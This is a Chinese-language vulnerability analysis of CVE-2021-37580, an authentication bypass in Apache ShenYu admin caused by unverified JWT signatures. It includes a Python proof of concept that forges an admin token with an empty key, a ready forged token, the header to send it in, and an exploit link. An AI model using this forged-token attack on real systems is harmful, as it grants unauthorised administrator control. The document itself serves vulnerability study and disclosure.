CVE-2021-37580-apacheshenyuadmin
漏洞
Apacheshenyuadmin-jwt越权漏洞，通过伪造jwt获取管理员。
漏洞成因：
硬编码jwtkey
1.
只解析了jwttoken的内容，并没有针对其内容进⾏判断
2.
影响版本
shenyu：v2.3.0-v2.4.0
漏洞分析
直接在权限校验处打上断点
org/apache/shenyu/admin/shiro/config/ShiroRealm.AuthenticationInfo
getCredential会获取header头内的token并返还。然后代码会判断token是否有值。
如果有就会进⼊getUserInfoByToken⽅法
org/apache/shenyu/admin/shiro/config/ShiroRealm.java-getUserInfoByToken
这⾥把token传⼊到了getIssuer⽅法内
跟进此⽅法，⾸先解码jwt之后返回jwt解码后到username字段到值。
继续向下⾛之后就是根据usernmae查找⽤⼾判断是否存在此⽤⼾，如果没有则返回usernamecan
notbefound。
如果存在则返回查找到的⽤⼾信息。
在这⼀套流程中，并没有针对jwt的key进⾏校验。
Shenyu-admin获取token的字段
org/apache/shenyu/admin/shiro/bean/StatelessAuthFilter.java-StatelessAuthFilter内
漏洞利⽤
poc：
Python
import jwt
def generateToken(username):
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    # 设置headers，即加密算法的配置 
    salt = ""
    # 随机的salt密钥，只有token⽣成者（同时也是校验者）⾃⼰能有，⽤于校验⽣成的token是
否合法 
    payload = {
        "userName": username,
    }
    token = jwt.encode(payload=payload, key=salt,
                       algorithm='HS256', headers=headers)
    return token
print(generateToken("admin"))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
传⼊⽤⼾名，拿到该⽤⼾的token。然后设置header头，X-Access-Token:XXXXX。即获得管理员权
限。
根据分析可以得知，代码本⾝只需要jwt内payload的username，所以sign为空也是可以绕过权限。
Apache
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIn0.
1
EXP:
https://github.com/fengwenhua/CVE-2021-37580